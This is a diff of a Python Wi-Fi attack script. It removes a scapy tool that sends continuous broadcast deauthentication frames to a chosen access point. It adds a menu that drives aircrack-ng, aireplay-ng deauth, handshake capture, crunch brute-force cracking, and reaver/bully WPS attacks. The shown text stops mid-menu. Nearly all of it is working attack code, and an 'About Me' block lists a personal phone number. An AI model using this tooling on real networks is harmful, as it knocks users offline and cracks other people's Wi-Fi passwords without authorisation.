@@ -1,484 +1,380 @@
-#!/usr/bin/env python3
-"""
-WiFi Deauth SuperTool - Unified WiFi Deauthentication Attack Framework
-Author: Ruby Doss (@rubydoss)
-Instagram: @mr__dawxz
 
-A professional, all-in-one tool for WiFi penetration testing that guides users
-through network scanning and deauthentication attacks.
-
-FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!
-"""
-
+# coding: utf-8
+#!/usr/bin/env python
 import os
-import signal
-import sys
-import time
-from collections import defaultdict
-from datetime import datetime
-from threading import Thread
+import subprocess
+from subprocess import check_call
+print("\nInstalling Needed Tools")
+print("\n")
+cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")
+cmd  = os.system("sleep 3 && clear")
+def intro():
+    cmd  = os.system("clear")
+    print("""\033[1;32m
+---------------------------------------------------------------------------------------
+██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
+██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
+██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
+██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
+╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
+ ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                                        Coded By @rubydoss
+                                                        insta : mr__dawxz
+                                                        github : @rubyrub4812s
+---------------------------------------------------------------------------------------                                                                     
+(1)Start monitor mode       
+(2)Stop monitor mode                        
+(3)Scan Networks                            
+(4)Getting Handshake(monitor mode needed)   
+(5)Install Wireless tools                   
+(6)Crack Handshake with rockyou.txt (Handshake needed)
+(7)Crack Handshake with wordlist    (Handshake needed)
+(8)Crack Handshake without wordlist (Handshake,essid needed)
+(9)Create wordlist                                     
+(10)WPS Networks attacks (Bssid,monitor mode needed)
+(11)Scan for WPS Networks
 
-try:
-    from scapy.all import *
-    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap
-    import colorama
-    from colorama import Fore, Back, Style
-    colorama.init()
-except ImportError as e:
-    print(f"❌ Missing dependencies: {e}")
-    print("Please install requirements: pip3 install -r requirements.txt")
-    sys.exit(1)
+(0)About Me
+(00)Exit
+-----------------------------------------------------------------------
+""")
+    print("\nEnter your choise here : !# ")
+    var = int(input(""))
+    if var == 1 :
+        print("\nEnter the interface:(Default(wlan0/wlan1))")
+        interface = input("")
+        order = "airmon-ng start {} && airmon-ng check kill".format(interface)
+        geny  = os.system(order)
+        intro()
+    elif var == 2 :
+        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
+        interface = input("")
+        order = "airmon-ng stop {} && service network-manager restart".format(interface)
+        geny  = os.system(order)
+        intro()
+    elif var == 3 :
+        print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")
+        interface = input("")
+        order = "airodump-ng {} -M".format(interface)
+        print("When Done Press CTRL+c")
+        cmd = os.system("sleep 3")
+        geny  = os.system(order)
+        cmd = os.system("sleep 10")
+        intro()
+    elif var == 4 :
+        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
+        interface = input("")
+        order     = "airodump-ng {} -M".format(interface)
+        print("\nWhen Done Press CTRL+c")
+        print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
+        print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
+        print("\nyou Can use 's' to arrange networks")
+        cmd       = os.system("sleep 7")
+        geny      = os.system(order)
+        print("\nEnter the bssid of the target?")
+        bssid     = str(input(""))
+        print("\nEnter the channel of the network?")
+        channel   = int(input())
+        print("Enter the path of the output file ?")
+        path = str(input(""))
+        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
+        print("the number of the packets Depends on the Distance Between you and the network")
+        dist = int(input(""))
+        order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
+        geny = os.system(order)
+        intro()
+    elif var == 5 :
+        def wire():
+            cmd = os.system("clear")
+            print("""
+1) Aircrack-ng                          17) kalibrate-rtl
+2) Asleap                               18) KillerBee
+3) Bluelog                              19) Kismet
+4) BlueMaho                             20) mdk3
+5) Bluepot                              21) mfcuk
+6) BlueRanger                           22) mfoc
+7) Bluesnarfer                          23) mfterm
+8) Bully                                24) Multimon-NG
+9) coWPAtty                             25) PixieWPS
+10) crackle                             26) Reaver
+11) eapmd5pass                          27) redfang
+12) Fern Wifi Cracker                   28) RTLSDR Scanner
+13) Ghost Phisher                       29) Spooftooph
+14) GISKismet                           30) Wifi Honey
+15) Wifitap                             31) gr-scan
+16) Wifite                              32) Back to main menu
+90) airgeddon
+91) wifite v2
 
-# Global variables
-monitor_interface = None
-scanning = False
-attacking = False
-attack_stats = {
-    'packets_sent': 0,
-    'start_time': None,
-    'target_bssid': None,
-    'target_ssid': None
-}
-
-def print_banner():
-    """Display tool banner with author information"""
-    banner = f"""
-{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
-║                    WiFi Deauth SuperTool                        ║
-║              Unified WiFi Penetration Framework                  ║
-╠══════════════════════════════════════════════════════════════════╣
-║  Author: Ruby Doss (@rubydoss)                                  ║
-║  Instagram: @mr__dawxz                                           ║
-║  GitHub: https://github.com/rubydoss                            ║
-╠══════════════════════════════════════════════════════════════════╣
-║  ⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️           ║
-╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
-
-{Fore.YELLOW}[!] Legal Notice: Only use on networks you own or have explicit permission to test.
-[!] Unauthorized WiFi attacks are illegal and punishable by law.{Style.RESET_ALL}
-"""
-    print(banner)
-
-def print_status(message, status_type="INFO"):
-    """Print colored status messages"""
-    colors = {
-        "INFO": Fore.BLUE,
-        "SUCCESS": Fore.GREEN, 
-        "WARNING": Fore.YELLOW,
-        "ERROR": Fore.RED
-    }
-    timestamp = datetime.now().strftime("%H:%M:%S")
-    print(f"{colors.get(status_type, Fore.WHITE)}[{timestamp}] [{status_type}]{Style.RESET_ALL} {message}")
-
-def check_root():
-    """Check if running with root privileges"""
-    if os.geteuid() != 0:
-        print_status("This tool requires root privileges to access wireless interfaces", "ERROR")
-        print_status("Please run with: sudo python3 wifi_deauth_supertool.py", "INFO")
-        sys.exit(1)
-
-def signal_handler(signum, frame):
-    """Handle Ctrl+C gracefully"""
-    global attacking, scanning
-    print_status("\\nShutdown signal received...", "WARNING")
-    attacking = False
-    scanning = False
-    print_status("Goodbye! 👋", "INFO")
-    sys.exit(0)
-
-def show_monitor_mode_instructions():
-    """Show instructions for manually setting up monitor mode"""
-    instructions = f"""
-{Fore.CYAN}📋 MONITOR MODE SETUP INSTRUCTIONS:{Style.RESET_ALL}
-
-Please manually set up monitor mode before using this tool:
-
-{Fore.YELLOW}Step 1: Check your wireless interfaces{Style.RESET_ALL}
-iwconfig
-
-{Fore.YELLOW}Step 2: Stop interfering processes{Style.RESET_ALL}
-sudo systemctl stop NetworkManager
-sudo airmon-ng check kill
-
-{Fore.YELLOW}Step 3: Enable monitor mode{Style.RESET_ALL}
-sudo airmon-ng start wlan0
-{Fore.GREEN}(Replace 'wlan0' with your interface name){Style.RESET_ALL}
-
-{Fore.YELLOW}Step 4: Verify monitor mode is enabled{Style.RESET_ALL}
-iwconfig
-{Fore.GREEN}(Look for 'Mode:Monitor' - interface name usually becomes wlan0mon){Style.RESET_ALL}
-
-{Fore.YELLOW}Step 5: Run this tool again and enter your monitor interface name{Style.RESET_ALL}
-
-{Fore.RED}⚠️  Common monitor interface names: wlan0mon, wlan1mon, etc.{Style.RESET_ALL}
-"""
-    print(instructions)
-
-def get_monitor_interface():
-    """Get monitor interface from user input"""
-    global monitor_interface
-    
-    print(f"\\n{Fore.CYAN}📡 Monitor Mode Interface Setup{Style.RESET_ALL}")
-    print("=" * 50)
-    
-    while True:
-        try:
-            interface = input(f"{Fore.YELLOW}Enter your monitor mode interface (e.g., wlan0mon): {Style.RESET_ALL}").strip()
-            
-            if not interface:
-                print_status("Please enter a valid interface name!", "ERROR")
-                continue
-            
-            # Check if interface exists and is in monitor mode
-            try:
-                import subprocess
-                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
-                
-                if 'No such device' in result.stderr:
-                    print_status(f"Interface '{interface}' not found!", "ERROR")
-                    print_status("Please check your interface name with: iwconfig", "INFO")
-                    continue
-                
-                if 'Mode:Monitor' not in result.stdout:
-                    print_status(f"Interface '{interface}' is not in monitor mode!", "ERROR")
-                    print_status("Please enable monitor mode first", "INFO")
-                    show_monitor_mode_instructions()
-                    continue
-                
-                monitor_interface = interface
-                print_status(f"Monitor interface verified: {interface}", "SUCCESS")
-                return interface
-                
-            except Exception as e:
-                print_status(f"Error checking interface: {e}", "ERROR")
-                continue
-                
-        except KeyboardInterrupt:
-            print_status("\\nExiting...", "INFO")
-            sys.exit(0)
-
-class NetworkScanner:
-    """WiFi network scanner class"""
-    
-    def __init__(self, interface):
-        self.interface = interface
-        self.networks = {}
-        self.clients = defaultdict(list)
-        self.scanning = False
-    
-    def packet_handler(self, packet):
-        """Handle captured packets during scanning"""
-        if not self.scanning:
-            return
-        
-        try:
-            if packet.haslayer(Dot11Beacon):
-                self.process_beacon(packet)
-        except Exception:
-            pass
-    
-    def process_beacon(self, packet):
-        """Process beacon frames to extract network info"""
-        try:
-            bssid = packet[Dot11].addr3
-            
-            # Extract SSID
-            ssid = ""
-            if packet.haslayer(Dot11Elt):
-                ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
-            
-            if not ssid:
-                ssid = "<Hidden>"
-            
-            # Get channel
-            channel = self.get_channel(packet)
-            
-            # Get encryption
-            crypto = self.get_crypto_type(packet)
-            
-            # Get signal strength
-            signal_strength = "N/A"
-            if packet.haslayer(RadioTap) and hasattr(packet[RadioTap], 'dBm_AntSignal'):
-                signal_strength = f"{packet[RadioTap].dBm_AntSignal} dBm"
-            
-            # Store network info
-            if bssid not in self.networks:
-                self.networks[bssid] = {
-                    'ssid': ssid,
-                    'bssid': bssid,
-                    'channel': channel,
-                    'crypto': crypto,
-                    'signal': signal_strength,
-                    'beacons': 1
-                }
+0)install all wireless tools
+""")
+            w = int(input("Enter The number of the tool : >>> "))
+            if w == 1 :
+                cmd = os.system("sudo apt-get update && apt-get install aircrack-ng")
+            elif w == 90:
+                print("sudo apt-get update && apt-get install git && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git")
+            elif w == 91:
+                print("sudo apt-get update && apt-get install git && git clone https://github.com/derv82/wifite2.git")
+            elif w == 2 :
+                cmd = os.system("sudo apt-get update && apt-get install asleep")
+            elif w == 3 :
+                cmd = os.system("sudo apt-get update && apt-get install bluelog")
+            elif w == 4 :
+                cmd = os.system("sudo apt-get update && apt-get install bluemaho")
+            elif w == 5 :
+                cmd = os.system("sudo apt-get update && apt-get install bluepot")
+            elif w == 6 :
+                cmd = os.system("sudo apt-get update && apt-get install blueranger")
+            elif w == 7 :
+                cmd = os.system("sudo apt-get update && apt-get install bluesnarfer")
+            elif w == 8 :
+                cmd = os.system("sudo apt-get update && apt-get install bully")
+            elif w == 9 :
+                cmd = os.system("sudo apt-get update && apt-get install cowpatty")
+            elif w == 10 :
+                cmd = os.system("sudo apt-get update && apt-get install crackle")
+            elif w == 11 :
+                cmd = os.system("sudo apt-get update && apt-get install eapmd5pass")
+            elif w == 12 :
+                cmd = os.system("sudo apt-get update && apt-get install fern-wifi-cracker")
+            elif w == 13 :
+                cmd = os.system("sudo apt-get update && apt-get install ghost-phisher")
+            elif w == 14 :
+                cmd = os.system("sudo apt-get update && apt-get install giskismet")
+            elif w == 15 :
+                cmd = os.system("apt-get install git && git clone git://git.kali.org/packages/gr-scan.git")
+            elif w == 16 :
+                cmd = os.system("sudo apt-get update && apt-get install kalibrate-rtl")
+            elif w == 17 :
+                cmd = os.system("sudo apt-get update && apt-get install killerbee-ng")
+            elif w == 18 :
+                cmd = os.system("sudo apt-get update && apt-get install kismet")
+            elif w == 19 :
+                cmd = os.system("sudo apt-get update && apt-get install mdk3")
+            elif w == 20 :
+                cmd = os.system("sudo apt-get update && apt-get install mfcuk")
+            elif w == 21 :
+                cmd = os.system("sudo apt-get update && apt-get install mfoc")
+            elif w == 22 :
+                cmd = os.system("sudo apt-get update && apt-get install mfterm")
+            elif w == 23 :
+                cmd = os.system("sudo apt-get update && apt-get install multimon-ng")
+            elif w == 24 :
+                cmd = os.system("sudo apt-get update && apt-get install pixiewps")
+            elif w == 25 :
+                cmd = os.system("sudo apt-get update && apt-get install reaver")
+            elif w == 26 :
+                cmd = os.system("sudo apt-get update && apt-get install redfang")
+            elif w == 27 :
+                cmd = os.system("sudo apt-get update && apt-get install rtlsdr-scanner")
+            elif w == 28 :
+                cmd = os.system("sudo apt-get update && apt-get install spooftooph")
+            elif w == 29 :
+                cmd = os.system("sudo apt-get update && apt-get install wifi-honey")
+            elif w == 30 :
+                cmd = os.system("sudo apt-get update && apt-get install wifitap")
+            elif w == 31 :
+                cmd = os.system("sudo apt-get update && apt-get install wifite")
+            elif w == 32 :
+                intro()
+            elif w == 0 :
+                cmd = os.system("apt-get install -y aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite")
             else:
-                self.networks[bssid]['beacons'] += 1
-                
-        except Exception:
-            pass
-    
-    def get_channel(self, packet):
-        """Extract channel from beacon"""
-        try:
-            p = packet[Dot11Elt]
-            while isinstance(p, Dot11Elt):
-                if p.ID == 3:  # DS Parameter Set
-                    return ord(p.info[:1])
-                p = p.payload
-            return "?"
-        except:
-            return "?"
-    
-    def get_crypto_type(self, packet):
-        """Determine encryption type"""
-        try:
-            crypto = []
-            
-            # Check privacy bit
-            if packet[Dot11].FCfield & 0x40:
-                crypto.append("WEP")
-            
-            # Parse information elements
-            p = packet[Dot11Elt]
-            while isinstance(p, Dot11Elt):
-                if p.ID == 48:  # RSN IE (WPA2/WPA3)
-                    crypto.append("WPA2")
-                elif p.ID == 221 and len(p.info) >= 4 and p.info[:4] == b'\\x00P\\xf2\\x01':
-                    crypto.append("WPA")
-                p = p.payload
-            
-            if not crypto:
-                return "Open"
-            return "/".join(crypto)
-            
-        except:
-            return "Unknown"
-    
-    def scan_networks(self, duration=20):
-        """Scan for networks for specified duration"""
-        print_status(f"Scanning for WiFi networks on {self.interface}...", "INFO")
-        print_status(f"Scanning for {duration} seconds - Please wait...", "INFO")
-        
-        self.scanning = True
-        
-        # Start packet capture in separate thread
-        capture_thread = Thread(target=self._capture_packets, daemon=True)
-        capture_thread.start()
-        
-        # Scan for specified duration with progress
-        for i in range(duration):
-            time.sleep(1)
-            print(f"\\r{Fore.YELLOW}[SCANNING] {i+1}/{duration}s - Networks found: {len(self.networks)}{Style.RESET_ALL}", end="")
-        
-        print()  # New line
-        self.scanning = False
-        
-        print_status(f"Scan complete! Found {len(self.networks)} networks", "SUCCESS")
-        return self.networks
-    
-    def _capture_packets(self):
-        """Capture packets in separate thread"""
-        try:
-            sniff(iface=self.interface, prn=self.packet_handler, 
-                  stop_filter=lambda x: not self.scanning, timeout=1)
-        except Exception as e:
-            print_status(f"Capture error: {e}", "ERROR")
+                print("Not Found")
+            wire()
+        wire()
+    elif var == 0 :
+        cmd = os.system("clear")
+        print("""
+Hi.
+My Name is 4nk17, A Ethical Hacker,Bug Bounty Hunter,Currently Working as Cyber Security Researcher.
+you can find on Instagram
 
-def display_networks(networks):
-    """Display discovered networks in a nice table"""
-    if not networks:
-        print_status("No networks found!", "WARNING")
-        return None
-    
-    print(f"\\n{Fore.CYAN}📡 Discovered WiFi Networks:{Style.RESET_ALL}")
-    print("=" * 80)
-    print(f"{'#':<3} {'SSID':<25} {'BSSID':<18} {'Ch':<4} {'Security':<12} {'Signal':<10}")
-    print("=" * 80)
-    
-    network_list = list(networks.values())
-    
-    for i, network in enumerate(network_list, 1):
-        ssid = network['ssid'][:24] if len(network['ssid']) > 24 else network['ssid']
-        color = Fore.GREEN if network['crypto'] == "Open" else Fore.YELLOW
-        
-        print(f"{color}{i:<3} {ssid:<25} {network['bssid']:<18} {network['channel']:<4} "
-              f"{network['crypto']:<12} {network['signal']:<10}{Style.RESET_ALL}")
-    
-    return network_list
+https://www.instagram.com/ankit_kanojiiya/
 
-def select_target_network(networks):
-    """Let user select target network"""
-    network_list = display_networks(networks)
-    
-    if not network_list:
-        return None
-    
-    while True:
-        try:
-            choice = input(f"\\n{Fore.YELLOW}Select target network (1-{len(network_list)}) or 'q' to quit: {Style.RESET_ALL}")
-            
-            if choice.lower() == 'q':
-                return None
-            
-            choice = int(choice) - 1
-            
-            if 0 <= choice < len(network_list):
-                target = network_list[choice]
-                print_status(f"Selected target: {target['ssid']} ({target['bssid']})", "INFO")
-                return target
-            else:
-                print_status("Invalid choice! Please try again.", "ERROR")
-                
-        except ValueError:
-            print_status("Please enter a valid number or 'q' to quit!", "ERROR")
-        except KeyboardInterrupt:
-            print_status("\\nExiting...", "INFO")
-            sys.exit(0)
+Contack me +919768367597
 
-def confirm_attack(target):
-    """Get user confirmation for attack"""
-    print(f"\\n{Fore.RED}⚠️  WARNING: You are about to attack WiFi network:{Style.RESET_ALL}")
-    print(f"   SSID: {Fore.CYAN}{target['ssid']}{Style.RESET_ALL}")
-    print(f"   BSSID: {Fore.CYAN}{target['bssid']}{Style.RESET_ALL}")
-    print(f"   Security: {Fore.CYAN}{target['crypto']}{Style.RESET_ALL}")
-    
-    print(f"\\n{Fore.YELLOW}This will disconnect all clients from this network!{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}Only proceed if you have explicit permission to test this network.{Style.RESET_ALL}")
-    
-    while True:
-        try:
-            confirm = input(f"\\n{Fore.RED}Continue with deauth attack? [y/N]: {Style.RESET_ALL}").lower()
-            
-            if confirm in ['y', 'yes']:
-                return True
-            elif confirm in ['n', 'no', '']:
-                return False
-            else:
-                print_status("Please enter 'y' for yes or 'n' for no", "ERROR")
-                
-        except KeyboardInterrupt:
-            print_status("\\nExiting...", "INFO")
-            sys.exit(0)
+Feel Free to Contact,
 
-def perform_deauth_attack(interface, target):
-    """Perform continuous deauthentication attack"""
-    global attacking, attack_stats
-    
-    attack_stats['start_time'] = time.time()
-    attack_stats['target_bssid'] = target['bssid']
-    attack_stats['target_ssid'] = target['ssid']
-    attack_stats['packets_sent'] = 0
-    attacking = True
-    
-    print_status(f"Starting deauthentication attack on {target['ssid']}", "INFO")
-    print_status("Press Ctrl+C to stop the attack", "WARNING")
-    
-    try:
-        while attacking:
-            # Create deauth packet (broadcast to all clients)
-            packet = RadioTap() / Dot11(
-                type=0, subtype=12,
-                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
-                addr2=target['bssid'],       # AP
-                addr3=target['bssid']        # BSSID
-            ) / Dot11Deauth(reason=7)
-            
-            # Send packet
-            sendp(packet, iface=interface, verbose=False)
-            attack_stats['packets_sent'] += 1
-            
-            # Display stats every 10 packets
-            if attack_stats['packets_sent'] % 10 == 0:
-                duration = time.time() - attack_stats['start_time']
-                rate = attack_stats['packets_sent'] / duration if duration > 0 else 0
-                
-                print(f"\\r{Fore.GREEN}[ATTACKING] Packets: {attack_stats['packets_sent']} | "
-                      f"Rate: {rate:.1f}/sec | Duration: {int(duration)}s{Style.RESET_ALL}", end="")
-            
-            time.sleep(0.1)  # 100ms delay between packets
-            
-    except KeyboardInterrupt:
-        attacking = False
-        print(f"\\n{Fore.YELLOW}Attack stopped by user{Style.RESET_ALL}")
-    except Exception as e:
-        attacking = False
-        print_status(f"\\nAttack error: {e}", "ERROR")
-    
-    # Print final stats
-    duration = time.time() - attack_stats['start_time']
-    print(f"\\n\\n{Fore.CYAN}📊 Attack Summary:{Style.RESET_ALL}")
-    print(f"   Target: {attack_stats['target_ssid']} ({attack_stats['target_bssid']})")
-    print(f"   Packets sent: {attack_stats['packets_sent']}")
-    print(f"   Duration: {int(duration)} seconds")
-    print(f"   Average rate: {attack_stats['packets_sent']/duration:.1f} packets/sec")
+""")
+        quit()
+    elif var == 00:
+        exit()
+    elif var == 6:
+        if  os.path.exists("/usr/share/wordlists/rockyou.txt")==True:
+            print("\nEnter the path of the handshake file ?")
+            path = str(input(""))
+            order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
+            print("\nTo exit Press CTRL +C")
+            geny  = os.system(order)
+            sleep = os.system("sleep 5d")
+            exit()
+        elif os.path.exists("/usr/share/wordlists/rockyou.txt")==False:
+            cmd = os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
+            print("\nEnter the path of the handshake file ?")
+            path = str(input(""))
+            order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
+            print("\nTo exit Press CTRL +C")
+            geny  = os.system(order)
+            sleep = os.system("sleep 5d")
+            exit()
+    elif var == 7 :
+        print("\nEnter the path of the handshake file ?")
+        path = str(input(""))
+        print("\nEnter the path of the wordlist ?")
+        wordlist = str(input(""))
+        order = ("aircrack-ng {} -w {}").format(path,wordlist)
+        geny = os.system(order)
+        exit()
+    elif var == 8 :
+        print("\nEnter the essid of the network ?(Be careful when you type it and use 'the name of the network') ")
+        essid = str(input(""))
+        print("\nEnter the path of the handshake file ?")
+        path = str(input(""))
+        print("\nEnter the minimum length of the password (8/64)?")
+        mini = int(input(""))
+        print("\nEnter the maximum length of the password (8/64)?")
+        max  = int(input(""))
+        print("""
+---------------------------------------------------------------------------------------
+(1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
+(2)  Uppercase chars                                 (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
+(3)  Numeric chars                                   (0123456789)
+(4)  Symbol chars                                    (!#$%/=?{}[]-*:;)
+(5)  Lowercase + uppercase chars                     (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
+(6)  Lowercase + numeric chars                       (abcdefghijklmnopqrstuvwxyz0123456789)
+(7)  Uppercase + numeric chars                       (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
+(8)  Symbol + numeric chars                          (!#$%/=?{}[]-*:;0123456789)
+(9)  Lowercase + uppercase + numeric chars           (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789) 
+(10) Lowercase + uppercase + symbol chars            (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
+(11) Lowercase + uppercase + numeric + symbol chars  (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
+(12) Your Own Words and numbers
+-----------------------------------------------------------------------------------------
+Crack Password Could Take Hours,Days,Weeks,Months to complete
+and the speed of cracking will reduce because you generate a Huge,Huge Passwordlist
+may reach to Hundreds of TeRa Bits so Be patiant
+""")
+        print("\nEnter your choise here : ?")
+        set = str(input(""))
+        if set == "1":
+            test = str("abcdefghijklmnopqrstuvwxyz")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "2":
+            test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "3":
+            test = str("0123456789")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "4":
+            test = str("!#$%/=?{}[]-*:;")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "5":
+            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "6":
+            test = str("abcdefghijklmnopqrstuvwxyz0123456789")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "7":
+            test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "8":
+            test = str("!#$%/=?{}[]-*:;0123456789")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "9":
+            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "10":
+            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "11":
+            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;")
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        elif set == "12":
+            print("Enter you Own Words and numbers")
+            test  = str(input(""))
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            geny  = os.system(order)
+        else:
+            print("\nNot Found")
+            intro()
+        print("Copy the Password and Close the tool")
+        cmd5 = os.system("sleep 3d")
+    elif var == 9 :
+        print("\nEnter the minimum length of the password (8/64)?")
+        mini = int(input(""))
+        print("\nEnter the maximum length of the password (8/64)?")
+        max  = int(input(""))
+        print("\nEnter the path of the output file?")
+        path = str(input(""))
+        print("\nEnter what you want the password contain ?")
+        password = str(input(""))
+        order = ("crunch {} {} {} -o {}").format(mini,max,password,path)
+        geny = os.system(order)
+        a = ("The wordlist in >>>>> {} Named as SRART").format(path)
+        print(a)
+    elif var == 10:
+        cmd = os.system("clear")
+        print("""
+1)Reaver
+2)Bully
+3)wifite (Recommeneded)
+4)PixieWps
 
-def main_menu():
-    """Main application loop"""
-    global monitor_interface
-    
-    print_banner()
-    
-    # Check root privileges
-    check_root()
-    
-    # Setup signal handlers
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-    
-    # Get monitor interface from user
-    print_status("Setting up monitor mode interface...", "INFO")
-    monitor_interface = get_monitor_interface()
-    
-    if not monitor_interface:
-        print_status("No valid monitor interface provided. Exiting.", "ERROR")
-        return
-    
-    try:
-        while True:
-            print(f"\\n{Fore.CYAN}🚀 WiFi Deauth SuperTool - Main Menu{Style.RESET_ALL}")
-            print("=" * 45)
-            print(f"Monitor Interface: {Fore.GREEN}{monitor_interface}{Style.RESET_ALL}")
-            print("=" * 45)
-            print(f"  {Fore.GREEN}[1]{Style.RESET_ALL} Scan Networks & Launch Attack")
-            print(f"  {Fore.GREEN}[2]{Style.RESET_ALL} Change Monitor Interface") 
-            print(f"  {Fore.GREEN}[3]{Style.RESET_ALL} Show Monitor Mode Instructions")
-            print(f"  {Fore.GREEN}[4]{Style.RESET_ALL} Exit")
-            
-            choice = input(f"\\n{Fore.YELLOW}Choose option (1-4): {Style.RESET_ALL}")
-            
-            if choice == "1":
-                # Scan networks and attack
-                scanner = NetworkScanner(monitor_interface)
-                networks = scanner.scan_networks(20)
-                
-                if networks:
-                    target = select_target_network(networks)
-                    if target and confirm_attack(target):
-                        perform_deauth_attack(monitor_interface, target)
-                else:
-                    print_status("No networks found. Try scanning again or check your interface.", "WARNING")
-            
-            elif choice == "2":
-                # Change monitor interface
-                monitor_interface = get_monitor_interface()
-            
-            elif choice == "3":
-                # Show instructions
-                show_monitor_mode_instructions()
-            
-            elif choice == "4":
-                print_status("Goodbye! 👋", "INFO")
-                sys.exit(0)
-            
-            else:
-                print_status("Invalid choice! Please select 1, 2, 3, or 4.", "ERROR")
-                
-    except KeyboardInterrupt:
-        print_status("\\nExiting...", "INFO")
-        sys.exit(0)
-    except Exception as e:
-        print_status(f"Unexpected error: {e}", "ERROR")
-        sys.exit(1)
-
-if __name__ == "__main__":
-    main_menu()
+0) Back to Main Menu
+""")
+        print("Choose the kind of the attack(External WIFI Adapter Require) ?")
+        attack = int(input(""))
+        if attack == 1:
+            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))")
+            interface = str(input(""))
+            print("\nEnter the bssid of the network ?")
+            bssid = str(input(""))
+            order = ("reaver -i {} -b {} -vv").format(interface,bssid)
+            geny = os.system(order)
+            intro()
+        elif attack == 2:
+            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
+            interface = str(input(""))
+            print("\nEnter the bssid of the network ?")
+            bssid = str(input(""))
+            print("\nEnter the channel of the network ?")
+            channel = int(input(""))
+            order = ("bully -b {} -c {} --pixiewps {}").format(bssid,channel,interface)
+            geny = os.system(order)
+            intro()
+        elif attack == 3:
+            cmd = os.system("wifite")
+            intro()
+        elif attack == 4:
